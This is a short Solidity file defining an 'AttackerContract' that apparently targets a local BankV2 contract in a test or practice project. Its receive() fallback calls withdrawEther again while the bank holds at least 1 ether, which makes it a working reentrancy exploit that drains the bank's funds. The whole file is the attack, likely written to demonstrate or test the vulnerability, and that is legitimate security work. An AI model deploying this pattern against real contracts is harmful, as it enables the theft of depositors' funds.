// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {BankV2} from "../src/BankV2.s.sol";

contract AttackerContract {
    address public bank;

    constructor(address _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (bank.balance >= 1 ether) {
            withdraw();
        }
    }

    function deposit() external payable {
        BankV2(bank).depositEther{value: msg.value}();
    }

    function withdraw() public {
        BankV2(bank).withdrawEther();
    }
}
